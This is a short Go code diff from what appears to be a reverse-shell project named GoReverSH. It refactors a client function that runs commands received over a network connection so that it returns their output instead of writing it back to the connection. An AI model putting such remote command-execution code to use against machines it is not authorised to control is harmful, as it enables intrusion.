@@ -2,13 +2,12 @@ package pkgclient
 
 import (
 	"GoReverSH/utils"
-	"encoding/json"
 	"net"
 	"os/exec"
 	"runtime"
 )
 
-func ExecCommand(command string, conn net.Conn) error {
+func ExecCommand(command string, conn net.Conn) (*utils.Output, error) {
 	var cmd *exec.Cmd
 	//mac linux or windows
 	if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
@@ -18,13 +17,10 @@ func ExecCommand(command string, conn net.Conn) error {
 	}
 	out, err := cmd.Output()
 	if err != nil {
-		return err
+		return nil, err
 	}
 
 	output := utils.Output{Type: utils.MESSAGE, Message: out}
-	err = json.NewEncoder(conn).Encode(output)
-	if err != nil {
-		return err
-	}
-	return nil
+
+	return &output, nil
 }
